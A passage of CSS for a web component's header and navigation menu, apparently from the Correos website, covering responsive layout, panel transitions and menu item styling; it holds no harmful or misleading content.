			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.--hide-on-desktop.sc-correos-cdk-core-header {
				display: none
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.--hide-label-on-mobile.sc-correos-cdk-core-header {
			display: none
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.--hide-label-on-mobile.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				padding: 0
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-quick-access.sc-correos-cdk-core-header .cdk-header-quick-access-item.--hide-label-on-desktop.sc-correos-cdk-core-header>a.sc-correos-cdk-core-header>span.sc-correos-cdk-core-header {
				display: none
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-title.sc-correos-cdk-core-header {
			font-weight: bold
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-container.sc-correos-cdk-core-header {
			display: block;
			position: absolute;
			left: 0;
			background-color: white;
			width: 100%;
			border-bottom: 1px solid var(--theme-color-softGrey);
			top: 8px
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-container.sc-correos-cdk-core-header .cdk-header-input-search.sc-correos-cdk-core-header {
				width: 100%
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-container--mobile-open.sc-correos-cdk-core-header {
			display: -ms-flexbox;
			display: flex
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-container--mobile-open.sc-correos-cdk-core-header .cdk-header-input-search.sc-correos-cdk-core-header {
			width: 90%;
			display: inline-block;
			position: relative;
			border-right: 1px solid var(--theme-color-softGrey)
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-container--mobile-open.sc-correos-cdk-core-header .cdk-header-input-search.sc-correos-cdk-core-header {
				border-right: none
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-container.sc-correos-cdk-core-header .cdk-header-close-button.sc-correos-cdk-core-header {
			display: inline-block;
			position: relative;
			width: 10%
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-container.sc-correos-cdk-core-header .cdk-header-close-button.sc-correos-cdk-core-header {
				display: none
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-container.sc-correos-cdk-core-header .cdk-header-close-button.sc-correos-cdk-core-header .cdk-header-close-icon.sc-correos-cdk-core-header {
			margin: 0 auto;
			color: var(--_cdk-core-header-text-color)
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-container--mobile-close.sc-correos-cdk-core-header {
			display: none
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .cdk-header-input-container.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex;
				width: 410px;
				position: relative;
				border-bottom: none;
				top: 0
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .--displayNone.sc-correos-cdk-core-header {
			display: none
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-header.sc-correos-cdk-core-header .cdk-header-wrapper.sc-correos-cdk-core-header .--displayNone.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header {
			position: absolute;
			left: 0;
			right: 0;
			z-index: 16;
			display: none;
			top: var(--_height);
			height: calc(100% - var(--_height))
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header {
				top: var(--_height-large);
				height: calc(100% - var(--_height-large))
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.--show.sc-correos-cdk-core-header {
			display: block
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.--show.sc-correos-cdk-core-header .cdk-nav-overlay.sc-correos-cdk-core-header {
			opacity: 1
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.--show.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header {
			opacity: 1
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header {
			position: absolute;
			display: block;
			z-index: 8;
			top: 0;
			bottom: 0;
			left: 0;
			right: 0;
			width: 100%;
			height: 100%;
			opacity: 0
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header {
				display: -ms-flexbox;
				display: flex
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header {
				-webkit-transition: opacity 0.15s linear;
				transition: opacity 0.15s linear;
				display: -ms-flexbox;
				display: flex
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header::before {
			-webkit-transition: background-color 0.3s linear;
			transition: background-color 0.3s linear;
			will-change: background-color;
			content: "";
			display: none;
			-ms-flex: 1 1 auto;
			flex: 1 1 auto
		}

		@media (max-width: var(--theme-layout-wrapper)) and (min-width: 640px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header::before {
				padding-left: 1.5rem
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header::before {
				display: none
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-scroll-bar.sc-correos-cdk-core-header {
			margin-left: 10px
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-scroll-bar.sc-correos-cdk-core-header {
				margin-left: 0px
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-scroll-bar.sc-correos-cdk-core-header {
				margin-left: 0px
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header {
			position: absolute;
			top: 0;
			right: 0;
			left: 0;
			bottom: 0;
			overflow-y: auto;
			overflow-x: hidden
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header {
				position: initial
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header {
				position: relative
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.--lv-first.sc-correos-cdk-core-header {
			-webkit-transition: background-color 0.3s linear;
			transition: background-color 0.3s linear;
			will-change: background-color;
			z-index: 7
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.--lv-first.sc-correos-cdk-core-header {
				max-width: 368px;
				width: 50vw
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.--lv-first.sc-correos-cdk-core-header {
				max-width: 468px;
				z-index: 11
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.--lv-second.sc-correos-cdk-core-header {
			width: 100%;
			height: 100%;
			z-index: 9;
			pointer-events: none;
			position: relative
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.--lv-second.sc-correos-cdk-core-header {
				pointer-events: all;
				width: initial;
				min-width: 464px
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.--lv-second.--show.sc-correos-cdk-core-header {
			pointer-events: all
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.--lv-second.sc-correos-cdk-core-header .cdk-nav-page-click-outside.sc-correos-cdk-core-header {
			position: absolute;
			top: 0;
			left: 0;
			right: 0;
			bottom: 0;
			z-index: 9;
			display: none
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.--lv-second.sc-correos-cdk-core-header .cdk-nav-page-click-outside.sc-correos-cdk-core-header {
				display: block
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header {
			-webkit-box-sizing: border-box;
			box-sizing: border-box;
			padding: 1.5rem 1.5rem 2rem 1.5rem
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.--lv-first.sc-correos-cdk-core-header {
			height: 100%;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.--lv-first.sc-correos-cdk-core-header>*.sc-correos-cdk-core-header {
			width: 100%
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.--lv-first.sc-correos-cdk-core-header {
				margin-left: 12px
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.--lv-first.sc-correos-cdk-core-header {
				width: 430px;
				margin-left: 40px
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.--lv-second.sc-correos-cdk-core-header {
			width: 100%;
			height: 100%;
			position: relative;
			overflow: auto;
			z-index: 10;
			color: var(--_cdk-core-header-subpanel-text-subpanel);
			background-color: var(--_cdk-core-header-subpanel-bg);
			-webkit-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
			transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
			opacity: 0;
			pointer-events: none;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column;
			padding: 1.5rem;
			-webkit-transform: translateX(20px);
			transform: translateX(20px)
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.--lv-second.sc-correos-cdk-core-header>*.sc-correos-cdk-core-header {
			width: 100%
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.--lv-second.sc-correos-cdk-core-header {
				padding: 0 2.5rem 2rem 2.5rem
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.--lv-second.sc-correos-cdk-core-header {
				-webkit-transform: translateX(-20px);
				transform: translateX(-20px);
				padding: 0 4rem 2rem 4rem
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.--lv-second.--open.sc-correos-cdk-core-header {
			-webkit-transform: translateX(0px);
			transform: translateX(0px);
			opacity: 1;
			pointer-events: all
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header {
			display: -ms-flexbox;
			display: flex;
			margin-bottom: 1rem
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header {
				display: none
			}
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header {
				display: none
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header .cdk-nav-switch-option.sc-correos-cdk-core-header {
			position: relative;
			text-align: center;
			-ms-flex-pack: center;
			justify-content: center;
			margin-right: 1rem;
			min-width: 84px
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header .cdk-nav-switch-option.sc-correos-cdk-core-header:last-child {
			margin-right: 0
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header .cdk-nav-switch-option.sc-correos-cdk-core-header>input.sc-correos-cdk-core-header {
			position: absolute;
			cursor: pointer;
			opacity: 0;
			top: 0;
			left: 0;
			right: 0;
			margin: 0;
			width: 100%;
			height: 100%
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header .cdk-nav-switch-option.sc-correos-cdk-core-header>label.sc-correos-cdk-core-header {
			position: relative;
			height: 2.5rem;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			cursor: pointer;
			-webkit-transition: background-color 0.15s linear;
			transition: background-color 0.15s linear;
			outline: none
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header .cdk-nav-switch-option.sc-correos-cdk-core-header>label.sc-correos-cdk-core-header::after {
			content: "";
			display: block;
			width: 0%;
			opacity: 0;
			will-change: opacity, width;
			-webkit-transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
			transition: all 0.3s cubic-bezier(0.165, 0.84, 0.44, 1);
			height: 1px;
			position: absolute;
			bottom: 0;
			background-color: rgba(128, 128, 128, 0.5)
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header .cdk-nav-switch-option.sc-correos-cdk-core-header>input.sc-correos-cdk-core-header:checked+label.sc-correos-cdk-core-header {
			font-weight: bold
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header .cdk-nav-switch-option.sc-correos-cdk-core-header>input.sc-correos-cdk-core-header:checked+label.sc-correos-cdk-core-header::after {
			content: "";
			display: block;
			opacity: 1;
			width: 100%;
			height: 1px;
			position: absolute;
			bottom: 0
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-switch.sc-correos-cdk-core-header .cdk-nav-switch-option.sc-correos-cdk-core-header>input.sc-correos-cdk-core-header:focus+label.sc-correos-cdk-core-header {
			-webkit-box-shadow: inset 0 0 0 2px rgba(128, 128, 128, 0.5);
			box-shadow: inset 0 0 0 2px rgba(128, 128, 128, 0.5)
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-title.sc-correos-cdk-core-header {
			font-weight: normal;
			font-size: 0.875rem;
			line-height: 1.375rem;
			padding-bottom: 16px
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-title.sc-correos-cdk-core-header {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		@media (max-width: 639px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-title.sc-correos-cdk-core-header {
				display: none
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header {
			width: 100%;
			-webkit-box-sizing: border-box;
			box-sizing: border-box
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header {
				padding: 0 1.5rem 0 0
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header>a.sc-correos-cdk-core-header,
		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header>button.sc-correos-cdk-core-header {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			height: 100%;
			width: 100%;
			padding: 12px 0 12px 0
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.--active.sc-correos-cdk-core-header .cdk-nav-lv-first-item-text.sc-correos-cdk-core-header {
			font-weight: bold
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.--active.sc-correos-cdk-core-header .cdk-nav-lv-first-item-text.sc-correos-cdk-core-header:hover {
			text-decoration: underline;
			font-weight: bold
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.--with-border.sc-correos-cdk-core-header>a.sc-correos-cdk-core-header,
		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.--with-border.sc-correos-cdk-core-header>button.sc-correos-cdk-core-header {
			border-bottom: 1px solid rgba(128, 128, 128, 0.5)
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.--first-shared.sc-correos-cdk-core-header {
			margin-top: 1.5rem
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header .cdk-nav-lv-first-item-text.sc-correos-cdk-core-header {
			font-weight: lighter;
			font-size: 1.125rem;
			line-height: 1.625rem;
			text-align: left
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header .cdk-nav-lv-first-item-text.sc-correos-cdk-core-header {
				font-size: 1.5rem;
				line-height: 2.25rem
			}
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header .cdk-nav-lv-first-item-text.sc-correos-cdk-core-header:hover {
			text-decoration: underline;
			font-weight: 400
		}

		.sc-correos-cdk-core-header-h .cdk-core-header-root.sc-correos-cdk-core-header .cdk-nav.sc-correos-cdk-core-header .cdk-nav-content.sc-correos-cdk-core-header .cdk-nav-page.sc-correos-cdk-core-header .cdk-nav-page-content.sc-correos-cdk-core-header .cdk-nav-lv-first.sc-correos-cdk-core-header .cdk-nav-lv-first-item.sc-correos-cdk-core-header .cdk-nav-lv-first-item-icon.sc-correos-cdk-core-header {
			margin-right: 1rem
		}

